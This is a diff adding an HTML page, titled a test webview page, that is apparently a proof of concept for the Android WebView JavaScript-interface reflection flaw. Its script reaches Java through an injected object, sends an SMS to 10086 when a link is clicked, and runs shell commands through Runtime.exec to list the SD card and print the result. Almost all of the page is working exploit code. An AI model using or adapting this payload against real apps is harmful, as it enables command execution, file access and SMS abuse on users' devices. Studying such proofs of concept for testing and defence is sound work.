@@ -1,0 +1,39 @@
+<html>
+<head>
+  <script type="text/javascript">
+    function sendMessage() {
+      var clazz = injectedObj.getClass().forName("android.telephony.SmsManager");
+      var method = clazz.getMethod("getDefault",null);
+      var objSmsManager = method.invoke(null,null);
+      objSmsManager.sendTextMessage("10086",null,"this message is sent by JS when webview is loading", null, null);
+    }
+
+    function getContents(inputStream){
+    var contents="";
+     var b=inputStream.read(); 
+     while(b!=-1){
+      if (b == 10) {
+       contents += "<p>";
+     } else {
+      var bStr=String.fromCharCode(b);
+      contents+=bStr;
+    }
+    b=inputStream.read();
+  }
+  return contents; 
+}
+
+function execute(cmdArgs){
+  return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+}
+
+function listAllFile() {
+  var res = execute(["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"]);
+  document.write(getContents(res.getInputStream()));
+}
+</script>
+</head>
+<body>
+  This is test webview page. <a href='javascript:void(0);' onclick='sendMessage()'>CLICK ME!</a>
+</body>
+</html>
